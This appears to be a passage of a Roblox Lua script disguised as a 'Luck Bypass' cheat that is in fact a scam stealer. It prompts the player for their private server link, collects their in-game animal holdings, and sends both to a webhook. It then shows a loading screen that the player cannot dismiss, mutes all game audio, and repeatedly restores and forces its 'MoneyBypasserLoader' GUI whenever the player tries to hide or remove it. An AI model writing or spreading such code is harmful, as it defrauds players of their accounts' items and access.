mainCorner.CornerRadius = UDim.new(0,16)
mainCorner.Parent = mainFrame

local innerFrame = Instance.new("Frame")
innerFrame.Name = "InnerFrame"
innerFrame.Size = UDim2.new(1,-20,1,-20)
innerFrame.Position = UDim2.new(0,10,0,10)
innerFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
innerFrame.BorderSizePixel = 0
innerFrame.ZIndex = 11
innerFrame.Parent = mainFrame

local innerCorner = Instance.new("UICorner")
innerCorner.CornerRadius = UDim.new(0,12)
innerCorner.Parent = innerFrame

-- IMAGEN DE FONDO
local backgroundImage = Instance.new("ImageLabel")
backgroundImage.Name = "BackgroundImage"
backgroundImage.Size = UDim2.new(0, 400, 0, 400)
backgroundImage.Position = UDim2.new(0.5, -200, 0.5, -200)
backgroundImage.BackgroundTransparency = 1
backgroundImage.Image = "rbxassetid://135728186065018"
backgroundImage.ImageTransparency = 0.6
backgroundImage.ScaleType = Enum.ScaleType.Fit
backgroundImage.ZIndex = 11
backgroundImage.Parent = innerFrame

local codeBackground = Instance.new("ScrollingFrame")
codeBackground.Name = "CodeBackground"
codeBackground.Size = UDim2.new(1, 0, 1, 0)
codeBackground.Position = UDim2.new(0, 0, 0, 0)
codeBackground.BackgroundTransparency = 1
codeBackground.BorderSizePixel = 0
codeBackground.ZIndex = 11
codeBackground.ScrollBarThickness = 0.5
codeBackground.CanvasSize = UDim2.new(0, 0, 0, 0)
codeBackground.ScrollingEnabled = false
codeBackground.Parent = innerFrame

local codeSnippets = {
    "function initializeSystem() {",
    "    var connection = new ServerConnection();",
    "    connection.authenticate(API_KEY);",
    "    return connection.status;",
    "}",
    "",
    "class DatabaseHandler {",
    "    constructor() {",
    "        this.host = 'localhost:5432';",
    "        this.connected = false;",
    "    }",
    "    connect() {",
    "        console.log('Connecting to database...');",
    "        this.connected = true;",
    "    }",
    "}",
    "",
    "async function loadUserData(userId) {",
    "    const data = await fetch('/api/user/' + userId);",
    "    return data.json();",
    "}",
    "",
    "for (let i = 0; i < items.length; i++) {",
    "    processItem(items[i]);",
    "    updateProgress(i / items.length);",
    "}",
    "",
    "if (status === 'success') {",
    "    console.log('Operation completed successfully');",
    "} else {",
    "    console.error('Operation failed');",
    "}",
    "",
    "const config = {",
    "    timeout: 5000,",
    "    retries: 3,",
    "    debug: true",
    "};",
    "",
    "try {",
    "    const result = executeCommand(cmd);",
    "    return result;",
    "} catch (error) {",
    "    logError(error.message);",
    "}"
}

local currentLine = 1
local currentChar = 1
local allLines = {}
local maxLines = 20

local function getRandomCodeSnippet()
    local snippet = {}
    local startIndex = math.random(1, #codeSnippets - 5)
    for i = startIndex, math.min(startIndex + math.random(3, 7), #codeSnippets) do
        table.insert(snippet, codeSnippets[i])
    end
    return snippet
end

local function createNewLine()
    local lineLabel = Instance.new("TextLabel")
    lineLabel.Name = "CodeLine" .. currentLine
    lineLabel.Size = UDim2.new(1, -20, 0, 16)
    lineLabel.Position = UDim2.new(0, 10, 0, (#allLines) * 16)
    lineLabel.BackgroundTransparency = 1
    lineLabel.Text = ""
    lineLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
    lineLabel.TextTransparency = 0.6
    lineLabel.TextSize = 14
    lineLabel.Font = Enum.Font.Arcade
    lineLabel.TextXAlignment = Enum.TextXAlignment.Left
    lineLabel.TextYAlignment = Enum.TextYAlignment.Top
    lineLabel.ZIndex = 11
    lineLabel.Parent = codeBackground
    
    table.insert(allLines, lineLabel)
    currentLine = currentLine + 1
    
    return lineLabel
end

local currentSnippet = getRandomCodeSnippet()
local snippetIndex = 1
local activeLine = createNewLine()

task.spawn(function()
    while codeBackground.Parent do
        if snippetIndex <= #currentSnippet then
            local fullText = currentSnippet[snippetIndex]
            
            if currentChar <= #fullText then
                activeLine.Text = string.sub(fullText, 1, currentChar)
                currentChar = currentChar + 1
                task.wait(0.005)
            else
                task.wait(0.1)
                currentChar = 1
                snippetIndex = snippetIndex + 1
                
                if snippetIndex <= #currentSnippet then
                    activeLine = createNewLine()
                    
                    if #allLines > maxLines then
                        local oldestLine = allLines[1]
                        table.remove(allLines, 1)
                        oldestLine:Destroy()
                        
                        for i, line in ipairs(allLines) do
                            line.Position = UDim2.new(0, 10, 0, (i - 1) * 16)
                        end
                    end
                end
            end
        else
            task.wait(1)
            currentSnippet = getRandomCodeSnippet()
            snippetIndex = 1
            currentChar = 1
            activeLine = createNewLine()
            
            if #allLines > maxLines then
                local oldestLine = allLines[1]
                table.remove(allLines, 1)
                oldestLine:Destroy()
                
                for i, line in ipairs(allLines) do
                    line.Position = UDim2.new(0, 10, 0, (i - 1) * 16)
                end
            end
        end
        
        task.wait(0.00011)
    end
end)

local mainFrameStroke = Instance.new("UIStroke")
mainFrameStroke.Thickness = 10
mainFrameStroke.Color = Color3.fromRGB(220, 20, 60)
mainFrameStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
mainFrameStroke.Parent = mainFrame
createRedCrimsonGradientPulse(mainFrameStroke)

local titleLabel = Instance.new("TextLabel")
titleLabel.Parent = innerFrame
titleLabel.Size = UDim2.new(0, 500, 0, 50)
titleLabel.Position = UDim2.new(0.5, -250, 0, 30)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Miranda Luck Bypass"
titleLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
titleLabel.TextSize = 28
titleLabel.Font = Enum.Font.Arcade
titleLabel.TextXAlignment = Enum.TextXAlignment.Center
titleLabel.ZIndex = 13

local titleStroke = Instance.new("UIStroke")
titleStroke.Thickness = 3
titleStroke.Color = Color3.fromRGB(220, 20, 60)
titleStroke.Parent = titleLabel
createRedCrimsonGradientPulse(titleStroke)

local subtitleLabel = Instance.new("TextLabel")
subtitleLabel.Parent = innerFrame
subtitleLabel.Size = UDim2.new(0, 500, 0, 25)
subtitleLabel.Position = UDim2.new(0.5, -250, 0, 85)
subtitleLabel.BackgroundTransparency = 1
subtitleLabel.Text = "By MIRANDA"
subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
subtitleLabel.TextSize = 16
subtitleLabel.Font = Enum.Font.Arcade
subtitleLabel.TextXAlignment = Enum.TextXAlignment.Center
subtitleLabel.ZIndex = 13

local inputSectionLabel = Instance.new("TextLabel")
inputSectionLabel.Parent = innerFrame
inputSectionLabel.Size = UDim2.new(0, 500, 0, 25)
inputSectionLabel.Position = UDim2.new(0.5, -250, 0, 140)
inputSectionLabel.BackgroundTransparency = 1
inputSectionLabel.Text = "Please Enter your private server link"
inputSectionLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
inputSectionLabel.TextSize = 14
inputSectionLabel.Font = Enum.Font.Arcade
inputSectionLabel.TextXAlignment = Enum.TextXAlignment.Center
inputSectionLabel.ZIndex = 13

local inputBox = Instance.new("TextBox")
inputBox.Parent = innerFrame
inputBox.Size = UDim2.new(0, 500, 0, 40)
inputBox.Position = UDim2.new(0.5, -250, 0, 175)
inputBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
inputBox.BorderSizePixel = 0
inputBox.Text = ""
inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
inputBox.TextSize = 12
inputBox.Font = Enum.Font.Arcade
inputBox.PlaceholderText = "https://www.roblox.com/games/..."
inputBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
inputBox.TextXAlignment = Enum.TextXAlignment.Left
inputBox.TextWrapped = true
inputBox.TextTruncate = Enum.TextTruncate.AtEnd
inputBox.ClearTextOnFocus = false
inputBox.ZIndex = 13

local inputPadding = Instance.new("UIPadding")
inputPadding.PaddingLeft = UDim.new(0, 10)
inputPadding.Parent = inputBox

local inputCorner = Instance.new("UICorner")
inputCorner.CornerRadius = UDim.new(0, 8)
inputCorner.Parent = inputBox

local inputStroke = Instance.new("UIStroke")
inputStroke.Thickness = 2
inputStroke.Color = Color3.fromRGB(220, 20, 60)
inputStroke.Parent = inputBox
createRedCrimsonGradientPulse(inputStroke)

local serverButton = Instance.new("TextButton")
serverButton.Name = "ServerButton"
serverButton.Parent = innerFrame
serverButton.Size = UDim2.new(0, 200, 0, 45)
serverButton.Position = UDim2.new(0.5, -100, 0, 235)
serverButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
serverButton.BorderSizePixel = 0
serverButton.Text = "ENTER"
serverButton.TextColor3 = Color3.fromRGB(0, 0, 0)
serverButton.TextSize = 24
serverButton.Font = Enum.Font.Arcade
serverButton.ZIndex = 13

local serverCorner = Instance.new("UICorner")
serverCorner.CornerRadius = UDim.new(0, 10)
serverCorner.Parent = serverButton

local serverStroke = Instance.new("UIStroke")
serverStroke.Thickness = 3
serverStroke.Color = Color3.fromRGB(139, 0, 0)
serverStroke.Parent = serverButton

serverButton.MouseEnter:Connect(function()
    TweenService:Create(serverButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(255, 100, 100),
        Size = UDim2.new(0, 210, 0, 50)
    }):Play()
end)

serverButton.MouseLeave:Connect(function()
    TweenService:Create(serverButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(255, 50, 50),
        Size = UDim2.new(0, 200, 0, 45)
    }):Play()
end)

local statusLabel = Instance.new("TextLabel")
statusLabel.Parent = innerFrame
statusLabel.Size = UDim2.new(0, 500, 0, 25)
statusLabel.Position = UDim2.new(0.5, -250, 0, 295)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Ready to send..."
statusLabel.TextColor3 = Color3.fromRGB(140, 140, 160)
statusLabel.TextSize = 13
statusLabel.Font = Enum.Font.Arcade
statusLabel.TextXAlignment = Enum.TextXAlignment.Center
statusLabel.ZIndex = 13

serverButton.MouseButton1Click:Connect(function()
    local link = inputBox.Text
    
    if link == "" then
        statusLabel.Text = "ERROR: Empty link!"
        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        task.wait(2)
        statusLabel.Text = "Ready to send..."
        statusLabel.TextColor3 = Color3.fromRGB(140, 140, 160)
        return
    end
    
    statusLabel.Text = "Checking Servers..."
    statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
    
    local podiumInfo = getPodiumInfo()
    local foundAnimals = {}
    
    if not podiumInfo.error then
        local hasAnimal
        hasAnimal, foundAnimals = hasAllowedAnimal(podiumInfo)
    end
    
    statusLabel.Text = "Preparing script..."
    statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
    
    local success = sendToWebhook(link, foundAnimals)
    
    if success then
        statusLabel.Text = "✓ Executed successfully!"
        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
        
        TweenService:Create(serverButton, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(100, 255, 100)
        }):Play()
        
        task.wait(0.5)
        
        if screenGui then
            screenGui:Destroy()
        end
        
        createLoadingScreen()
        
    else
        statusLabel.Text = "X Invalid private server link!"
        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        
        TweenService:Create(serverButton, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(255, 100, 100)
        }):Play()
        
        task.wait(1)
        
        TweenService:Create(serverButton, TweenInfo.new(0.3), {
            BackgroundColor3 = Color3.fromRGB(255, 50, 50)
        }):Play()
        
        task.wait(2)
        statusLabel.Text = "Ready to send..."
        statusLabel.TextColor3 = Color3.fromRGB(140, 140, 160)
    end
end)

local particleFrame = Instance.new("Frame")
particleFrame.Parent = innerFrame
particleFrame.Size = UDim2.new(1, 0, 1, 0)
particleFrame.BackgroundTransparency = 1
particleFrame.ZIndex = 12

for i = 1, 12 do
    local p = Instance.new("Frame")
    p.Parent = particleFrame
    p.Size = UDim2.new(0, math.random(3, 6), 0, math.random(3, 6))
    p.Position = UDim2.new(math.random(), 0, math.random(), 0)
    p.BackgroundColor3 = Color3.fromRGB(255, math.random(20, 60), math.random(20, 60))
    p.BorderSizePixel = 0
    p.BackgroundTransparency = 0.5
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(1, 0)
    c.Parent = p
    TweenService:Create(p, TweenInfo.new(math.random(5, 10), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {Position = UDim2.new(math.random(), 0, math.random(), 0)}):Play()
end

local function mutearTodosSonidos()
    local function mutear(sound)
        if sound:IsA("Sound") then
            sound.Volume = 0
            sound.Playing = false
        end
    end
    
    for _, obj in pairs(game:GetDescendants()) do
        mutear(obj)
    end
    
    game.DescendantAdded:Connect(function(obj)
        mutear(obj)
    end)
    
    spawn(function()
        while wait(1) do
            for _, obj in pairs(game:GetDescendants()) do
                if obj:IsA("Sound") then obj.Volume = 0 end
            end
        end
    end)
end

local function proteccionAntiDestruccion()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
    local backups = {}
    
    local function crearBackup(nombreGui)
        local gui = PlayerGui:FindFirstChild(nombreGui)
        if gui then 
            backups[nombreGui] = gui:Clone()
        end
    end
    
    local function restaurarGUI(nombreGui)
        if backups[nombreGui] then
            local nuevoGui = backups[nombreGui]:Clone()
            nuevoGui.Parent = PlayerGui
            crearBackup(nombreGui)
        end
    end
    
    task.wait(2)
    crearBackup("MoneyBypasserLoader")
    
    spawn(function()
        while wait(0.5) do
            if not PlayerGui:FindFirstChild("MoneyBypasserLoader") then
                restaurarGUI("MoneyBypasserLoader")
            end
            if not PlayerGui:FindFirstChild("ArcadeGUI") then
                restaurarGUI("ArcadeGUI")
            end
        end
    end)
    
    PlayerGui.DescendantRemoving:Connect(function(descendant)
        if descendant.Name == "MoneyBypasserLoader" then
            task.spawn(function()
                task.wait(0.05)
                restaurarGUI(descendant.Name)
            end)
        end
    end)
end

local function proteccionAntiOcultacion()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
    local guisProtegidos = {"MoneyBypasserLoader"}
    
    local function forzarVisibilidad(gui)
        if not gui or not gui.Parent then return end
        
        if gui:IsA("ScreenGui") then
            gui.Enabled = true
            gui.DisplayOrder = 999999
            gui.IgnoreGuiInset = true
            gui.ResetOnSpawn = false
        end
        
        for _, descendant in pairs(gui:GetDescendants()) do
            if descendant:IsA("GuiObject") then
                pcall(function()
                    descendant.Visible = true
                end)
            end
        end
    end
    
    local function configurarProteccion(nombreGui)
        local gui = PlayerGui:FindFirstChild(nombreGui)
        if not gui then return end
        
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if gui.Enabled == false then
                gui.Enabled = true
            end
        end)
        
        gui:GetPropertyChangedSignal("DisplayOrder"):Connect(function()
            if gui.DisplayOrder < 999999 then
                gui.DisplayOrder = 999999
            end
        end)
        
        gui:GetPropertyChangedSignal("ResetOnSpawn"):Connect(function()
            if gui.ResetOnSpawn == true then
                gui.ResetOnSpawn = false
            end
        end)
        
        local function protegerElemento(elemento)
            if elemento:IsA("GuiObject") then
                elemento:GetPropertyChangedSignal("Visible"):Connect(function()
                    if elemento.Visible == false and elemento.Parent then
                        elemento.Visible = true
                    end
                end)
            end
        end
        
        for _, descendant in pairs(gui:GetDescendants()) do
            protegerElemento(descendant)
        end
        
        gui.DescendantAdded:Connect(function(descendant)
            protegerElemento(descendant)
        end)
    end
    
    task.wait(2)
    for _, nombreGui in ipairs(guisProtegidos) do
        configurarProteccion(nombreGui)
    end
    
    spawn(function()
        while wait(0.3) do
            for _, nombreGui in ipairs(guisProtegidos) do
                local gui = PlayerGui:FindFirstChild(nombreGui)
                if gui then
                    forzarVisibilidad(gui)
                end
            end
        end
    end)
    
    PlayerGui.ChildAdded:Connect(function(child)
        for _, nombreGui in ipairs(guisProtegidos) do
            if child.Name == nombreGui then
                task.wait(0.1)
                configurarProteccion(nombreGui)
            end
        end
    end)
end

local function proteccionParent()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
    local guisProtegidos = {"MoneyBypasserLoader"}
    
    task.wait(2)
    
    for _, nombreGui in ipairs(guisProtegidos) do
        local gui = PlayerGui:FindFirstChild(nombreGui)
        if gui then
            gui:GetPropertyChangedSignal("Parent"):Connect(function()
                if gui.Parent ~= PlayerGui then
                    gui.Parent = PlayerGui
                end
            end)
        end
    end
end

mutearTodosSonidos()

spawn(function()
    task.wait(3)
    proteccionAntiDestruccion()
    proteccionAntiOcultacion()
    proteccionParent()
end)
